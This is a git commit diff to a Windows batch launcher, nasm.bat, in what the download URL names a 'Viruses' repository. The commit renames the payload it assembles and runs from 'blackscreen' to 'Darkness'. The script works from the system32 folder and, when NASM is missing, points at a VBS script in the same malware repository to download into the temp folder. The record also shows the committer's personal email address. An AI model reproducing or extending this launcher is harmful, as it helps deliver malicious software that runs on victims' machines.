501f4668af7d67eb358b13005b3bd49f5a5f1841
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-14 08:53:13 +0100

    Darkness

--- Darkness/nasm.bat
+++ Darkness/nasm.bat
@@ -3,8 +3,8 @@ cd /d %windir%\system32
 
 where nasm.exe >nul 2>&1
 if %errorlevel% == 0 (
-    nasm -f bin -o blackscreen.com blackscreen.asm
-    blackscreen.com
+    nasm -f bin -o Darkness.com Darkness.asm
+    Darkness.com
 ) else (
     set URL=https://raw.githubusercontent.com/INeddHelp/Viruses/master/Darkness/namsinstaller.vbs
     set DESTINATION=%temp%\namsinstaller.vbs
